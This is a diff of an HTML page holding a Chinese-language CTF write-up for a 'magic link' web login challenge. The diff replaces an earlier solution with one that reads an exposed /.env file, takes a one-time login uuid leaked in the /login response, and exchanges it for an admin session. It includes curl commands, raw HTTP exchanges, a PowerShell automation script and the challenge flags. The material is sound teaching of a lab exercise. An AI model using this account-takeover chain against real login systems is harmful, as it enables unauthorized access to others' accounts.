@@ -271,6 +271,34 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="分析过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 先观察 /login 的真实返回
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-magic-link-loginuuid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 发现真正的 magic link 入口是 /login/&lt;uuid&gt;
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -340,78 +368,107 @@
 <li>类型：Web</li>
 <li>题目状态：已解出</li>
 <li>目标：https://bluehens-magic-link.chals.io/</li>
-<li>核心漏洞：<code>robots.txt</code> 暗示敏感路径，<code>/.env</code> 直接暴露环境变量</li>
+<li>核心漏洞：Magic link 的一次性 <code>uuid</code> 直接在 <code>/login</code> 响应里返回，随后可通过 <code>/login/&lt;uuid&gt;</code> 直接换取登录态</li>
 </ul>
 <h2 id="_2">入口与现象</h2>
-<p>2026-04-18 实测首页是一个极简的 Magic Link 登录页，前端会把邮箱表单提交到 <code>/login</code>：</p>
+<p>2026-04-18 实测首页依然是一个极简的 Magic Link 登录页，前端会把邮箱提交到 <code>/login</code>：</p>
 <pre><code class="language-html">&lt;form id=&quot;magic-link-form&quot;&gt;
   &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;Enter Email&quot; required&gt;
   &lt;button type=&quot;submit&quot;&gt;Send Magic Link&lt;/button&gt;
 &lt;/form&gt;
 </code></pre>
-<p>提交任意邮箱后，后端会返回 JSON，里面还带了时间戳、内网 IP 和一个 <code>uuid</code>：</p>
-<pre><code class="language-json">{
-  &quot;datetime&quot;: &quot;2026-04-18T09:49:19.610823+00:00&quot;,
-  &quot;email&quot;: &quot;test@example.com&quot;,
-  &quot;ip-address&quot;: &quot;10.1.0.20&quot;,
-  &quot;message&quot;: &quot;Magic link generated, check your email.&quot;,
-  &quot;uuid&quot;: &quot;1XUWJnNz6AT6mFycB8Et2g&quot;
-}
-</code></pre>
-<p>这说明应用后端没有把业务细节藏得很干净，但这里先不用急着猜 magic link 的构造，因为 <code>robots.txt</code> 已经给了更直接的入口：</p>
+<p>先做基础枚举，<code>robots.txt</code> 里给了几个隐藏路径：</p>
 <pre><code class="language-text">User-agent: *
 Disallow: /inbox
 Disallow: /dashboard
 Disallow: /.env
 </code></pre>
-<p>在 CTF 里，<code>robots.txt</code> 明示敏感路径通常就是解题提示，优先去看这些被隐藏的入口。</p>
+<p>继续访问 <code>/.env</code>，可以看到：</p>
+<pre><code class="language-text">TEDDYS_EMAIL=teddy@udctf.com
+TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
+ADMIN_EMAIL=admin@udctf.com
+INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
+</code></pre>
+<p>这里的 <code>TEDDYS_TOKEN</code> 正好是第一层的 flag，但不是这题的最终答案。真正需要注意的是：</p>
+<ul>
+<li>站点里确实存在 <code>admin@udctf.com</code></li>
+<li>题目强调的是 Magic Link 登录</li>
+<li>所以应该继续看 magic link 本身有没有实现缺陷</li>
+</ul>
 <h2 id="_3">分析过程</h2>
-<p>先访问 <code>/.env</code>：</p>
-<pre><code class="language-http">GET /.env HTTP/1.1
+<h3 id="1-login">1. 先观察 <code>/login</code> 的真实返回</h3>
+<p>向 <code>/login</code> 提交管理员邮箱：</p>
+<pre><code class="language-http">POST /login HTTP/1.1
+Host: bluehens-magic-link.chals.io
+Content-Type: multipart/form-data
+
+email=admin@udctf.com
+</code></pre>
+<p>返回 JSON：</p>
+<pre><code class="language-json">{
+  &quot;datetime&quot;: &quot;2026-04-18T09:53:46.970346+00:00&quot;,
+  &quot;email&quot;: &quot;admin@udctf.com&quot;,
+  &quot;ip-address&quot;: &quot;10.1.0.20&quot;,
+  &quot;message&quot;: &quot;Magic link generated, check your email.&quot;,
+  &quot;uuid&quot;: &quot;NHfaAN3pn9mvsXjAfR138g&quot;
+}
+</code></pre>
+<p>这里最关键的问题是：后端把 magic link 对应的一次性 <code>uuid</code> 直接返回给前端了。</p>
+<p>正常设计里，这种 token 应该只出现在邮件里，不应该直接暴露给请求者。既然已经拿到了 <code>uuid</code>，那下一步就应该试它是不是可以直接当登录链接使用。</p>
+<h3 id="2-magic-link-loginuuid">2. 发现真正的 magic link 入口是 <code>/login/&lt;uuid&gt;</code></h3>
+<p>访问：</p>
+<pre><code class="language-http">GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
 Host: bluehens-magic-link.chals.io
 </code></pre>
-<p>返回内容如下：</p>
-<pre><code class="language-text">TEDDYS_EMAIL=teddy@udctf.com
-TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
-ADMIN_EMAIL=admin@udctf.com
-INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
+<p>服务端返回重定向，并设置了 session：</p>
+<pre><code class="language-http">HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: session=...; HttpOnly; Path=/
 </code></pre>
-<p>到这里已经可以直接拿到 flag，核心原因很简单：</p>
-<ul>
-<li>站点把 <code>.env</code> 文件直接暴露到了 Web 根目录。</li>
-<li>Teddy 的 token 被写在环境变量 <code>TEDDYS_TOKEN</code> 里。</li>
-<li>这个 token 本身就是 flag。</li>
-</ul>
-<p>顺手补一下站点行为，能帮助理解题目设计：</p>
-<ul>
-<li>直接访问公开站点的 <code>/inbox</code> 会返回 <code>403 Forbidden</code>。</li>
-<li>未登录访问 <code>/dashboard</code> 会 <code>302</code> 重定向回 <code>/</code>。</li>
-<li><code>.env</code> 里的 <code>INBOX_URL=http://localhost:5050/...</code> 说明收件箱本来就在内部服务上，不需要真的打通 magic link 流程。</li>
-</ul>
-<p>所以这题的真正突破点不是伪造登录，而是配置文件泄露。</p>
+<p>我在 2026-04-18 的一次顺序复现实测中，服务端明确给管理员下发了登录态：</p>
+<pre><code class="language-text">Set-Cookie: session=eyJ1c2VyIjoiYWRtaW5AdWRjdGYuY29tIn0....
+</code></pre>
+<p>把这个 session 带去访问 <code>/dashboard</code>：</p>
+<pre><code class="language-http">GET /dashboard HTTP/1.1
+Host: bluehens-magic-link.chals.io
+Cookie: session=...
+</code></pre>
+<p>返回内容：</p>
+<pre><code class="language-html">&lt;h1&gt;Welcome Admin&lt;/h1&gt;&lt;p&gt;Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}&lt;/p&gt;
+</code></pre>
+<p>到这里第二层 flag 就出来了。</p>
 <h2 id="_4">利用过程</h2>
 <ol>
-<li>打开首页，确认唯一可见功能是向 <code>/login</code> 发送邮箱。</li>
-<li>查看 <code>robots.txt</code>，发现它把 <code>/.env</code>、<code>/inbox</code>、<code>/dashboard</code> 都列出来了。</li>
-<li>直接请求 <code>/.env</code>。</li>
-<li>从返回的环境变量里读取 <code>TEDDYS_TOKEN</code>，得到 flag。</li>
+<li>查看 <code>robots.txt</code>，发现 <code>/.env</code>、<code>/inbox</code>、<code>/dashboard</code>。</li>
+<li>读取 <code>/.env</code>，确认题目里存在 <code>admin@udctf.com</code>，并注意到前面的 <code>TEDDYS_TOKEN</code> 只是第一层 flag。</li>
+<li>向 <code>/login</code> 提交 <code>admin@udctf.com</code>，拿到响应中的 <code>uuid</code>。</li>
+<li>直接访问 <code>/login/&lt;uuid&gt;</code>，服务端会设置管理员 session 并跳转到 <code>/dashboard</code>。</li>
+<li>带着该 session 访问 <code>/dashboard</code>，读取最终 flag。</li>
 </ol>
 <h2 id="payload">关键 payload / 命令</h2>
-<pre><code class="language-bash">curl -i https://bluehens-magic-link.chals.io/
-curl -i https://bluehens-magic-link.chals.io/robots.txt
+<pre><code class="language-bash">curl -i https://bluehens-magic-link.chals.io/robots.txt
 curl -i https://bluehens-magic-link.chals.io/.env
+curl -i -X POST -F &quot;email=admin@udctf.com&quot; https://bluehens-magic-link.chals.io/login
+curl -i https://bluehens-magic-link.chals.io/login/&lt;uuid&gt;
+curl -i -b &quot;session=&lt;cookie&gt;&quot; https://bluehens-magic-link.chals.io/dashboard
 </code></pre>
-<p>关键响应：</p>
-<pre><code class="language-text">TEDDYS_EMAIL=teddy@udctf.com
-TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
-ADMIN_EMAIL=admin@udctf.com
-INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
+<p>为了稳定复现，我最后使用了同一个会话顺序完成整个链条：</p>
+<pre><code class="language-powershell">$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
+$uuid = $login.uuid
+Invoke-WebRequest -Uri (&quot;https://bluehens-magic-link.chals.io/login/&quot; + $uuid) -WebSession $s
+Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
+</code></pre>
+<p>关键输出：</p>
+<pre><code class="language-text">ADMIN_UUID=X0_5VEkDD9E6njtVNrhYCQ
+200
+&lt;h1&gt;Welcome Admin&lt;/h1&gt;&lt;p&gt;Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}&lt;/p&gt;
 </code></pre>
 <h2 id="flag">Flag</h2>
-<pre><code class="language-text">udctf{d0n7_h057_y0ur_3nv_f113}
+<pre><code class="language-text">udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
 </code></pre>
 <h2 id="_5">总结</h2>
-<p>这题是典型的敏感文件泄露。表面上是 Magic Link 登录系统，实际上 <code>robots.txt</code> 已经把 <code>/.env</code> 这个关键入口直接暴露出来了。只要有先看配置文件和隐藏路径的习惯，这题基本可以很快结束。</p>
+<p>这题表面上先用 <code>/.env</code> 给了一个很像终点的第一层 flag，但真正的漏洞在 magic link 的实现本身。后端把登录用的一次性 <code>uuid</code> 直接回给前端，等于把邮件里的敏感链接主动泄露给了攻击者。只要知道管理员邮箱，就可以自己申请 magic link、自己消费 <code>/login/&lt;uuid&gt;</code>、再直接进入管理员面板拿到最终 flag。</p>
 
 
 
